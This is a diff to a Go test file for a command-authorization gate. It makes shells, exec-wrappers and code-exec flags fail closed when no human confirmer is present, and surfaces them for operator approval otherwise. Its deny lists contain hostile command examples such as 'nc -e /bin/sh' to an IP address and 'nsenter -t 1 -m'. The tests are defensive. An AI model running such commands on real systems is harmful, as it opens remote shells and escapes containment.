@@ -23,10 +23,31 @@ func localGate(t *testing.T, scope string) *Gate {
 	return g
 }
 
-// The enforceability invariant: shells, interpreters, exec-wrappers, find
-// code-exec predicates, and raw-shell metacharacters stay denied in local mode.
+// localGateNoConfirmer is a LOCAL gate with NO confirmer. LOCAL always-confirm plus
+// no confirmer means no human is in the loop, so humanGovernedPath is false and the
+// structural shell/interpreter/exec-wrapper/exec-flag/metacharacter denials are
+// ENFORCED (and audited at the classifier layer, before the confirm layer). This is
+// the fail-closed path for the HITL denial-relaxation: with an approving confirmer
+// these same commands are surfaced for approval instead (see hitlrelax_test.go).
+func localGateNoConfirmer(t *testing.T, scope string) *Gate {
+	t.Helper()
+	s, err := ParseScope(strings.NewReader(scope))
+	if err != nil {
+		t.Fatal(err)
+	}
+	g := &Gate{Mode: Auto, Scope: s, Confirm: nil}
+	if err := g.Start(); err != nil {
+		t.Fatal(err)
+	}
+	return g
+}
+
+// The enforceability invariant on the no-human path: with no confirmer available,
+// shells, interpreters, exec-wrappers, find code-exec predicates, and raw-shell
+// metacharacters stay denied in local mode (fail closed). Under HITL (an approving
+// confirmer) these are instead surfaced for approval - see hitlrelax_test.go.
 func TestLocalProfileKeepsEnforceabilityDenials(t *testing.T) {
-	g := localGate(t, "local\n")
+	g := localGateNoConfirmer(t, "local\n")
 	denied := []Command{
 		{Binary: "bash", Args: []string{"-c", "x"}},
 		{Binary: "/bin/sh"},
@@ -60,7 +81,7 @@ func TestLocalProfileKeepsEnforceabilityDenials(t *testing.T) {
 }
 
 func TestLocalProfileDeniesExecWrappersAndMacInterpreters(t *testing.T) {
-	g := localGate(t, "local\n")
+	g := localGateNoConfirmer(t, "local\n")
 	denied := []Command{
 		{Binary: "nsenter", Args: []string{"-t", "1", "-m"}},
 		{Binary: "unshare", Args: []string{"-r"}},
@@ -88,10 +109,12 @@ func TestLocalProfileDeniesExecWrappersAndMacInterpreters(t *testing.T) {
 	}
 }
 
-// The known per-binary code-exec flags stay denied in local mode, in every
-// spelling the external profile denies, and the same tools run without them.
+// The known per-binary code-exec flags stay denied in local mode on the no-human
+// path (no confirmer), in every spelling the external profile denies; the same
+// tools run without them under HITL. Under HITL the exec-flag forms are surfaced
+// for approval instead (see hitlrelax_test.go).
 func TestLocalProfileDeniesCodeExecFlags(t *testing.T) {
-	g := localGate(t, "local\n")
+	g := localGateNoConfirmer(t, "local\n")
 	denied := []Command{
 		{Binary: "nc", Args: []string{"-e", "/bin/sh", "10.0.0.5"}},
 		{Binary: "nc", Args: []string{"-ve/bin/sh", "10.0.0.5", "80"}},
@@ -123,6 +146,8 @@ func TestLocalProfileDeniesCodeExecFlags(t *testing.T) {
 			t.Errorf("%v must be denied in local mode", c)
 		}
 	}
+	// The same tools without an exec flag run under HITL (an approving confirmer).
+	gc := localGate(t, "local\n")
 	allowed := []Command{
 		{Binary: "nc", Args: []string{"-v", "10.0.0.5", "80"}},
 		{Binary: "nmap", Args: []string{"-p", "80", "10.0.0.5"}},
@@ -131,7 +156,7 @@ func TestLocalProfileDeniesCodeExecFlags(t *testing.T) {
 		{Binary: "ip", Args: []string{"addr"}},
 	}
 	for _, c := range allowed {
-		if d := g.Authorize(context.Background(), c); !d.Allowed {
+		if d := gc.Authorize(context.Background(), c); !d.Allowed {
 			t.Errorf("%v must be allowed in local mode: %q", c, d.Reason)
 		}
 	}
@@ -187,9 +212,12 @@ func TestLocalProfileStillEnforcesEpisodeCap(t *testing.T) {
 	}
 }
 
-// A denied command in local mode is audited on the classifier layer.
+// On the no-human path (no confirmer) a structural denial in local mode is audited
+// at the classifier layer, before the confirm layer. (This also proves the
+// structural denial still fires there: were it not, the deny would be at the
+// confirm layer instead.)
 func TestLocalProfileAuditsStructuralDenial(t *testing.T) {
-	g := localGate(t, "local\n")
+	g := localGateNoConfirmer(t, "local\n")
 	var actions []string
 	recordingGate(g, &actions)
 	g.Authorize(context.Background(), Command{Binary: "bash", Args: []string{"-c", "x"}})
@@ -198,8 +226,9 @@ func TestLocalProfileAuditsStructuralDenial(t *testing.T) {
 	}
 }
 
-// Safe mode still confirms in the local profile (the confirmer runs after the
-// structural layers), and a structural denial never reaches the confirmer.
+// Safe mode still confirms in the local profile. An ordinary command is confirmed;
+// under the HITL denial-relaxation a shell is SURFACED for approval (allowed when
+// the confirmer approves, denied when it refuses) rather than auto-denied.
 func TestLocalProfileSafeConfirms(t *testing.T) {
 	s, _ := ParseScope(strings.NewReader("local\n"))
 	g := &Gate{Mode: Safe, Scope: s, Confirm: stubConfirmer{false}}
@@ -210,8 +239,14 @@ func TestLocalProfileSafeConfirms(t *testing.T) {
 	if d := g.Authorize(context.Background(), Command{Binary: "id"}); !d.Allowed {
 		t.Errorf("safe mode with an approving confirmer must allow: %q", d.Reason)
 	}
-	if d := g.Authorize(context.Background(), Command{Binary: "bash"}); d.Allowed {
-		t.Error("a shell must be denied even when the confirmer approves")
+	// HITL relaxation: a shell is surfaced and allowed when the operator approves.
+	if d := g.Authorize(context.Background(), Command{Binary: "bash", Args: []string{"-lc", "id"}}); !d.Allowed {
+		t.Errorf("a shell must be surfaced and allowed under HITL when approved: %q", d.Reason)
+	}
+	// And denied when the operator refuses (surfaced, not auto-allowed).
+	g.Confirm = stubConfirmer{false}
+	if d := g.Authorize(context.Background(), Command{Binary: "bash", Args: []string{"-lc", "id"}}); d.Allowed {
+		t.Error("a shell must be denied under HITL when the operator refuses")
 	}
 }
 
